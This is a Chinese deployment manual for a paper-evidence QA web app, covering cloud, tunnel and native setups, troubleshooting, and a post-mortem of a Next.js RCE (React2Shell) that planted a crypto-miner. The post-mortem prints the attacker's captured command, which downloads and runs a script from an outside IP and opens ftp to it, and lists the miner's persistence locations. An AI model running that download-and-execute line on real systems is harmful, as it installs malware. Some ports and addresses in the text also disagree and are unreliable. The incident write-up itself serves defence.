# 部署手册

> 目标：拿到一个**评审能持续访问**的公网地址，并配上评审专用账号。
> 本文给出三条路线，先看对比再选，不要跳着做。

---

## 一、先决策：三条路线怎么选

| | A. 云主机（推荐） | B. 家里机器 + Tunnel | C. 无 Docker 直跑 |
|---|---|---|---|
| 成本 | 学生机约 10–30 元/月 | 0 元 | 同 A |
| 稳定性 | 高（机房 7×24） | **取决于你的机器不关机、不断网** | 高 |
| 首次耗时 | 1–2 小时 | 40 分钟 | 40 分钟 |
| 需要什么 | 云账号 + 一点预算 | Cloudflare 账号 | 一台常开的机器 |
| 风险 | 费用 | 评审期某天家里断电就失联 | 环境漂移 |

**建议选 A。** 赛题原文要求「评审期间须保持服务可用」，而这些材料从提交（11-18）到评审意见发布（次年 1 月底）有两个多月。用家里机器扛两个月的概率不高，一旦掉线就是"在线演示不可用"。

如果确实没有预算，选 B 但务必做两件事：机器设置永不睡眠、开机自启。

> **实战提醒（2026-11-14）**：国内云主机实测**连不上 Docker Hub**（拉不到
> `node:22-slim` / `python:3.12-slim`），Docker 路线在该环境走不通，最终采用了
> 路线 C 的原生部署（`scripts/deploy_ubuntu_native.sh`）。
> 完整过程、五个坑与排查命令见**第十节**。

## 二、路线 A：云主机

### A1. 买机器

| 项 | 建议 |
|---|---|
| 规格 | 2 核 4G 起（解析 507 页文档峰值内存约 300MB，但向量模型加载要 1–2G） |
| 系统 | Ubuntu 22.04 / 24.04 LTS |
| 磁盘 | 40G 起（模型缓存约 700MB + 数据） |
| 带宽 | 3M 够用（页面很小，PDF 按需加载） |

安全组 / 防火墙放行：**22**（SSH）、**80**、**443**。

### A2. 装 Docker

```bash
curl -fsSL https://get.docker.com | sh
sudo systemctl enable --now docker
sudo usermod -aG docker $USER   # 重新登录后生效
```

### A3. 拉代码并配置

```bash
git clone <你的仓库地址> evidence
cd evidence
cp .env.example .env
nano .env
```

`.env` 里必须改的：

```ini
AUTH_ENABLED=1
EVIDENCE_USERS=demo:换成你的演示密码,reviewer:换成你的评审密码
EVIDENCE_SECRET=用 openssl rand -hex 24 生成
DEEPSEEK_API_KEY=sk-...          # 有就填，没有也能跑（降级为抽取式）
HF_ENDPOINT=https://hf-mirror.com  # 国内强烈建议
API_BASE=http://api:8000
```

> **`EVIDENCE_SECRET` 不要用示例值**。它决定会话令牌能否被伪造。

### A4. 启动

先做一次**静态自检**（不需要 Docker，检查 COPY 源路径、compose 引用、
环境变量是否齐备）：

```bash
python scripts/check_deploy_static.py
```

25/25 通过再往下走，能省掉"构建到一半才报错"的时间。

```bash
docker compose up -d --build
docker compose logs -f api     # 首次会下载约 640MB 模型，等它出现 Uvicorn running
```

看到 `Uvicorn running on http://1.12.228.44:3000` 后，另开一个终端验证：

```bash
curl -s localhost:8000/api/health
# {"ok":true,"llm":"deepseek","chunks":0}
```

`chunks` 为 0 是正常的——**库是空的**。把论文放进去：

```bash
# 方式一：用容器内的脚本批量导入（推荐）
docker compose exec api python /app/scripts/fetch_corpus.py
docker compose exec api python /app/scripts/index_cli.py build "data/pdf/*.pdf"

# 方式二：从本机上传（走 API）
curl -F "file=@1706.03762v1.pdf" http://<你的域名>/api/papers
```

### A5. 配域名与 HTTPS（Caddy，最省事）

```bash
sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update && sudo apt install -y caddy
```

`/etc/caddy/Caddyfile`：

```caddy
evidence.example.com {
    reverse_proxy /api/* localhost:8000
    reverse_proxy /figures/* localhost:8000
    reverse_proxy localhost:3000
}
```

```bash
sudo systemctl reload caddy
```

Caddy 会自动申请并续期 Let's Encrypt 证书。记得把域名 A 记录指到服务器 IP。

### A6. 开机自启与备份

`docker-compose.yml` 里已为两个服务设置 `restart: unless-stopped`，Docker 服务本身开机自启后容器会自动拉起。

```bash
sudo systemctl enable docker
```

数据都在 `evidence-data` / `evidence-cache` 两个卷里。定期备份：

```bash
docker run --rm -v evidence_data:/data -v $(pwd):/backup alpine \
  tar czf /backup/evidence-data-$(date +%F).tar.gz -C /data .
```

### A7. 更新代码

```bash
git pull
docker compose up -d --build
docker compose exec api python /app/scripts/verify_all.py   # 更新后跑一遍
```

## 三、路线 B：家里机器 + Cloudflare Tunnel

### B1. 安装 cloudflared

Windows：

```powershell
winget install --id Cloudflare.cloudflared
```

Linux：

```bash
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared
chmod +x /usr/local/bin/cloudflared
```

### B2. 建隧道

```bash
cloudflared tunnel login          # 浏览器授权
cloudflared tunnel create evidence
cloudflared tunnel route dns evidence evidence.example.com
```

`~/.cloudflared/config.yml`：

```yaml
tunnel: evidence
credentials-file: C:\Users\<你>\.cloudflared\<tunnel-id>.json
ingress:
  - hostname: evidence.example.com
    service: http://localhost:3001
  - service: http_status:404
```

### B3. 让前后端都跑起来

先在本地把两个服务起好（`scripts/start.ps1`），并确认 `web/next.config.mjs` 的代理指向 `http://1.12.228.44:3000`。

### B4. 常驻

```powershell
cloudflared service install        # 注册为 Windows 服务
Start-Service cloudflared
```

Linux：`sudo cloudflared service install && sudo systemctl enable --now cloudflared`

### B5. 必须做的两件事

1. **电源设置**：控制面板 → 电源选项 → 睡眠设为"从不"。
2. **开机自启**：`cloudflared` 服务 + `scripts/start.ps1` 加进启动项（或用任务计划程序，触发器选"登录时"）。

## 四、路线 C：不用 Docker 直接跑

Linux（systemd）：

```ini
# /etc/systemd/system/evidence-api.service
[Unit]
Description=Evidence API
After=network.target
[Service]
WorkingDirectory=/opt/evidence
ExecStart=/opt/evidence/.venv/bin/python -m uvicorn app.main:app --host 127.0.0.1 --port 8000 --app-dir /opt/evidence/backend
Restart=always
[Install]
WantedBy=multi-user.target
```

前端同理，`ExecStart=/usr/bin/node node_modules/next/dist/bin/next start -p 3000`，`WorkingDirectory=/opt/evidence/web`。

```bash
sudo systemctl daemon-reload && sudo systemctl enable --now evidence-api
```

Windows：用 `scripts/start.ps1`，再用任务计划程序设置为"登录时运行"。

## 七、常见故障排查

| 现象 | 可能原因 | 处理 |
|---|---|---|
| 页面 502 / 空白 | 前端没起或代理地址错 | `docker compose ps`；检查 `API_BASE` |
| `/api/*` 返回 401 | 认证已开但没登录 | 正常行为；用 `reviewer` 账号登录 |
| `/api/*` 返回 404 | 反向代理只转了 `/`，没转 `/api` | 检查 Caddy/nginx 的路径规则 |
| 健康检查 `chunks: 0` | 库是空的 | 导入论文并建索引（见 A4） |
| 问答一直"证据不足" | 索引没建，或问题与库无关 | 先 `/api/papers` 确认库非空 |
| 首次启动卡在下载模型 | 访问 HuggingFace 慢 | `.env` 设 `HF_ENDPOINT=https://hf-mirror.com` |
| 检索/解析很慢 | CPU 太弱 | 2 核是最低要求；541 页解析约 3–6 分钟 |
| 上传 PDF 报 500 | 文件损坏或加密 | 换一个 PDF 试；加密 PDF 不支持 |
| 容器内存被 OOM | 向量模型加载 + 并发解析 | 4G 内存起步；避免同时上传多篇长文档 |

## 十、云主机实战记录（2026-11-14 真实部署）

这一节是**实际跑一遍的完整记录**，不是设计稿。目标机器是一台腾讯云轻量
服务器，配置很低，所以踩的坑对国内小机器有代表性。

### 10.1 最终形态

| 项 | 值 |
|---|---|
| 机型 | 腾讯云轻量应用服务器 · 入门型 |
| 规格 | **2 核 2GB / 40GB SSD / 2Mbps / 100GB 月流量** |
| 系统 | Ubuntu 22.04 LTS |
| 地域 | 广州 |
| 费用 | 35 元/月 × 3 个月 = **105 元** |
| 公网地址 | `http://<公网IP>:3000` |
| 进程托管 | systemd：`evidence-api`（8000，仅监听 127.0.0.1）+ `evidence-web`（3000，监听 0.0.0.0） |
| 内存策略 | 检测到内存 < 3.5G 时自动创建 **2GB swap** |
| 实测结果 | 22 篇论文 / 2347 片段；问答 0.8–2.3 秒；自检 **10/10** |

> 为什么不用 Docker：本机没装 Docker，镜像从未真实构建过；而目标机
> 内存只有 2GB，`next build` 在容器里更容易被 OOM。原生安装少一层抽象，
> 也与开发机验证过的环境完全一致。Docker 路线保留但未在此环境验证。

### 10.2 一条命令部署

```bash
curl -fsSL https://ghproxy.net/https://raw.githubusercontent.com/xmexico77-sketch/evidence/main/scripts/deploy_ubuntu_native.sh -o /tmp/dn.sh
sudo bash /tmp/dn.sh
```

脚本是**幂等**的：中断后重跑会跳过已完成的步骤（已构建的前端、已装好的依赖、
已有片段数的索引）。它依次做：

1. 内存 < 3.5G 则建 2G swap（2G 机器加载向量模型必需）
2. 装系统依赖 + Python 3.12（deadsnakes）+ Node 20
3. 取代码：git 克隆失败自动退回 **tarball 整包下载**（4 个镜像轮试）
4. pip 走清华源装后端依赖
5. `pnpm install --ignore-scripts` + `pnpm build`（已构建则跳过）
6. 写 systemd 单元并启动，等后端就绪
7. 查 `/api/health` 的 `chunks`，为 0 才下载语料并建索引

### 10.3 五个坑（含排查命令）

这一趟部署卡了 6 小时，全部卡在下面五处。**遇到同样现象可直接跳答案。**

#### 坑 1：连不上 GitHub（TLS 中断）

现象，脚本第一步就退出，后面什么都没跑：

```
fatal: unable to access 'https://github.com/...': 
GnuTLS recv error (-110): The TLS connection was non-properly terminated.
```

排查：

```bash
curl -sI --max-time 10 https://github.com | head -3   # 通常直接超时/断开
git -c http.version=HTTP/1.1 ls-remote https://github.com/xmexico77-sketch/evidence 2>&1 | head -3
```

原因：国内机房访问 GitHub 常见被中断；改 HTTP/1.1 只略微改善，**仍会断**。

修法（已内置脚本）：git 克隆失败后退回 `archive/refs/heads/main.tar.gz`
整包下载——单次 HTTP GET，比 git 的 pack 传输稳得多；镜像依次尝试
`ghproxy.net` → `gh-proxy.com` → `ghfast.top` → 直连。

```bash
# 手工兜底（任选一个镜像）
curl -fL --http1.1 -o /tmp/src.tar.gz \
  https://ghproxy.net/https://github.com/xmexico77-sketch/evidence/archive/refs/heads/main.tar.gz
mkdir -p /opt/evidence && tar xzf /tmp/src.tar.gz -C /opt/evidence --strip-components=1
```

#### 坑 2：镜像站对大文件限速到 12KB/s，且 curl 会把截断响应当成功

现象：30MB 的语料包下 35 分钟还没完；更隐蔽的是 PDF **下了一半就当成功**，
解析出来只有前 2 页。

排查：

```bash
# 逐镜像测速（返回 B/s）
for M in https://ghproxy.net/ https://gh-proxy.com/ https://ghfast.top/; do
  printf '%-28s' "$M"
  curl -s -o /dev/null --max-time 12 -w '%{speed_download} B/s\n' \
    "${M}https://raw.githubusercontent.com/xmexico77-sketch/evidence/main/README.md"
done

# 确认 PDF 是否被截断（页数明显偏少就是截断）
file /opt/evidence/data/pdf/*.pdf | head
```

原因：代理对 GitHub raw 的大文件限速，且中途断开时 `curl -o` 仍返回 0。

修法：**让服务器自己直连 arXiv**，实测 33KB/s（比代理快）,并用
`wget -c`（断点续传 + `--tries` 重试）代替 curl：

```bash
cd /opt/evidence/data/pdf
wget -c -q --tries=15 --timeout=30 -O 1706.03762v7.pdf \
  https://export.arxiv.org/pdf/1706.03762v7 || \
wget -c -q --tries=15 --timeout=30 -O 1706.03762v7.pdf \
  https://arxiv.org/pdf/1706.03762v7
```

#### 坑 3：pnpm 拒绝执行依赖的安装脚本

现象：

```
× installing dependencies
└─ Ignored build scripts: sharp@0.34.5
Error: ERR_PNPM_IGNORED_BUILDS
```

排查：

```bash
pnpm --version     # 实测服务器上是 pnpm 12.18.0
```

原因：pnpm 10 起默认禁止依赖执行安装脚本；**pnpm 12 已不再读
`package.json` 里的 `pnpm.onlyBuiltDependencies`**（会打印 WARN 说该字段被忽略），
所以写在 package.json 里没用。

修法：从命令行绕开门禁。

```bash
pnpm install --ignore-scripts
pnpm rebuild sharp 2>/dev/null || true   # 失败也无妨：本项目不用 next/image
```

#### 坑 4：npm 撞上 pnpm 的目录结构后崩溃

现象（坑 3 失败后脚本回退到 npm，于是撞上）：

```
npm error Cannot read properties of null (reading 'isDescendantOf')
```

原因：目录里已是 pnpm 的 `.pnpm` 符号链接结构，npm 处理不了。

修法：回退前必须清干净。

```bash
rm -rf node_modules .next package-lock.json
```

脚本现在的顺序是：`pnpm --ignore-scripts` →（失败）`rm -rf` 后 npm。

#### 坑 5：问答请求超时 240 秒——重排模型在偷偷下载

现象：登录、文献库、四个页面全部正常，`/api/health` 返回
`{"chunks":2347}`，但 `/api/ask` 一直挂着直到超时；健康检查里
`llm: deepseek` 说明模型链路没问题。

排查：

```bash
journalctl -u evidence-api -n 60 | grep -iE "rerank|hugging|fetch|download"
# 或直接看进程在干什么
top -bn1 | head -15
```

原因：`bge-reranker-v2-m3-int8` 是**首次查询时才惰性加载**的，模型数百 MB。
这台机器到 HuggingFace 镜像只有约 30KB/s，等于卡死——表现为超时而不是报错，
是最难猜的一类故障。

修法：窄带宽机器关掉重排，退回 RRF 融合排序。

```bash
echo 'EVIDENCE_RERANK=0' | sudo tee -a /opt/evidence/.env
sudo systemctl restart evidence-api
```

代价：中文问英文库时少了 cross-encoder 兜底，相关性闸门退化为恒通过
（只靠模型自身判"证据不足"）。本地与正常带宽环境默认仍开启。

#### 附带坑：`evidence.db` 存在 ≠ 索引有数据

后端启动时就会创建空库，所以"文件存在就跳过建索引"的判断会永远跳过。
正确做法是查实际片段数：

```bash
curl -s http://127.0.0.1:8000/api/health    # 看 chunks 是否 > 0
```

索引建好后**必须重启后端**，否则运行中的进程仍持有空索引：

```bash
sudo systemctl restart evidence-api
```

### 10.4 日常运维命令

```bash
# 状态与日志
systemctl status evidence-api evidence-web
journalctl -u evidence-api -f
journalctl -u evidence-web -n 50

# 重启（改完 .env 必须重启才生效）
sudo systemctl restart evidence-api
sudo systemctl restart evidence-web

# 看文献库规模
curl -s http://127.0.0.1:8000/api/health

# 重建索引
cd /opt/evidence && sudo ./.venv/bin/python scripts/index_cli.py build "data/pdf/*.pdf"

# 本地自检（在服务器上跑，比从外网跑快）
cd /opt/evidence && ./.venv/bin/python scripts/check_deploy.py \
  http://127.0.0.1:3000 --user reviewer --password '你的评审密码'
```

两个服务都 `systemctl enable` 过，**机器重启会自动拉起**，不需要人工干预。

### 10.5 换一台机器要做什么

1. 买机器（Ubuntu 22.04，2 核起，安全组放行 **3000**）
2. 跑 10.2 的一条命令
3. 把 `.env` 里的 `DEEPSEEK_API_KEY` 填上（否则降级为抽取式回答）
4. 窄带宽机器追加 `EVIDENCE_RERANK=0`
5. 从外网跑 `check_deploy.py`，**10/10 才交地址**
6. 用 `scripts/set_demo_url.py --url <新地址> --password <新密码>` 批量更新
   `提交清单.md` / `交接说明.md` / `部署手册.md`，避免手改漏掉
7. 提交材料里的地址与账号同步更新

## 十一、安全事件复盘（2026-11-14，真实被入侵）

部署完成 2 小时后，腾讯云主机安全连发两条告警：

```
/tmp/.net/.a              威胁等级：严重
/opt/evidence/web/x86_64.dusk    威胁等级：严重
```

**这不是误报。** 机器被植入了挖矿木马（Dusk / Kinsing 家族）。下面是完整过程与结论，
同类项目可以直接照抄防护措施。

### 11.1 根因：不是 SSH 爆破，是应用被 RCE

第一反应会怀疑 SSH 弱口令。但取证结果否定了这一点：

```bash
# 1) 没有任何密码登录记录，只有我方密钥
sudo grep -aE "Accepted password" /var/log/auth.log*      # 空
# 2) 看进程树，父进程是 Next.js
sudo ps -ef --forest | grep -A3 next-server
```

输出：

```
next-server (v15.5.4, pid 23983)
└─ /bin/sh -c wget http://62.60.226.31:235/logic.sh -O /tmp/logic.sh; sh /tmp/logic.sh
   └─ sh /tmp/logic.sh
      └─ ftp -n 62.60.226.31
```

**攻击者无需登录，直接通过 RSC 请求在 Next.js 进程里执行了 shell。**
对应 [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182) /
[CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)（俗称 React2Shell，**CVSS 10.0**）：

| 项 | 内容 |
|---|---|
| 影响面 | 使用 App Router + React Server Components 的 Next.js 15.x / 16.x |
| 我们的版本 | Next.js **15.5.4** + React **19.1.0** → 受影响 |
| 修复版本 | Next.js **15.5.7**（同线 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8） |
| 官方立场 | **无 workaround**，必须升级；且升级后要轮换所有密钥 |

### 11.2 木马的四处持久化（只删一处会复活）

清掉 `cron.d` 后它 1 分钟内又写回来了，因为做了四重驻留：

```bash
sudo crontab -l                                   # root crontab：@reboot + */5 自愈
sudo cat /etc/cron.d/net-helper215                # cron.d
sudo cat /etc/init.d/net-helper215                # init.d（含 rc2/rc3/rc0 软链）
sudo cat /etc/systemd/system/net-helper215.service # systemd 单元
```

另有一个「先执行体」留在 `/var/lib/.net/.a`（1.2MB 可执行文件），
`/tmp/DUSKNET.ONTOPDUSKBOT` 是它的组织标记文件。

**排查命令（发现可疑就全量核对这五处）：**

```bash
sudo crontab -l; ls /etc/cron.d/ /etc/init.d/ | sort
grep -rl "net-helper\|/var/lib/\.net" /etc/systemd/system /etc/cron* /etc/init.d 2>/dev/null
find / -xdev \( -name "*.dusk" -o -name ".net" -o -name "net-helper*" \) 2>/dev/null
sudo ls -l /proc/[0-9]*/exe 2>/dev/null | grep -i deleted   # 无文件木马
```

### 11.3 一个容易被误判的副作用

木马会**杀掉竞争进程**，包括我们的 `wget`/`curl`。当时表现为：

```
bash: line 1: 25402 Killed  wget -c .../1706.03762v7.pdf
```

我一开始误判成"内存不足被 OOM"，查了 swap、ulimit、systemd-oomd 都不是。
**看到莫名其妙的 `Killed` 且系统有异常告警时，先当作入侵信号排查。**

### 11.4 处置流程（这次实际执行的顺序）

1. **先轮换所有密钥**（最急）——API Key 在 `.env` 里，root 被拿走后必然泄露；
2. **重装系统**（不是删文件）——root 被拿下后无法证明还有没有别的后门；
3. **先加固再部署**：密钥登录、禁用密码、ufw 只留必要端口、fail2ban；
4. **升级修复版本**（本次 15.5.7 / React 19.1.10）并重新构建；
5. **服务以非 root 用户运行**（`User=ubuntu`），缩小二次被攻破的影响面；
6. 从公网跑 `check_deploy.py`，10/10 通过后才交地址。

### 11.5 教训

- **公网暴露的 Web 应用优先级高于 SSH 加固**。这次 SSH 早就只剩密钥了，
  洞在应用层，加固 SSH 完全没用。
- **依赖要有升级习惯**。CVSS 10.0 的洞，补丁发布后 24 小时内就会被批量扫描利用。
- **小机器上"莫名其妙的 Killed"要当安全信号**，不要只往资源不足想。
- 部署脚本里 `set -euo pipefail` 配合 `ls *.pdf | wc -l` 会在空目录时误退出，
  已改为 `find ... | wc -l`（这次排查时顺带修的）。
